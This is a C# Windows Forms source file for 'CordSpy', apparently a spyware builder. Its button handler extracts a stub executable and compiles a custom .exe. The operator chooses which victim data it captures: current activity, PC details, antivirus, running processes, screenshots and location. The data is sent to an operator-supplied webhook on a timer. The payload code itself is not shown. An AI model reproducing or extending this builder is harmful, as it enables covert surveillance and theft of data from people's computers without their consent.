using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CordSpy
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void label2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Extract.Extraction.Extract("CordSpy", Path.GetTempPath(), "Stub", "CordSpyStub.exe");
            string LogTimer;
            string Webhook;
            LogTimer = guna2TextBox1.Text;
            Webhook = guna2TextBox2.Text;
            string CurrentActivity = CurrentActivityCheck.Checked.ToString();
            string PcInfo = PcInfoCheck.Checked.ToString();
            string AntiVirus = AntiVirusCheck.Checked.ToString();
            string RunningProcesses = RunningProcessesCheck.Checked.ToString();
            string Screenshot = ScreenshotCheck.Checked.ToString();
            string Location = LocationCheck.Checked.ToString();
            string text = StubText.Text;
            bool exe = text.EndsWith(".exe");
            if (exe)
            {
                Compile.Compile.CreateExe(text, CurrentActivity, PcInfo, AntiVirus, RunningProcesses, Screenshot, Location, Webhook, LogTimer);
            }
            else
            {
                Compile.Compile.CreateExe(text + ".exe", CurrentActivity, PcInfo, AntiVirus, RunningProcesses, Screenshot, Location, Webhook, LogTimer);
            }
        }
    }
}
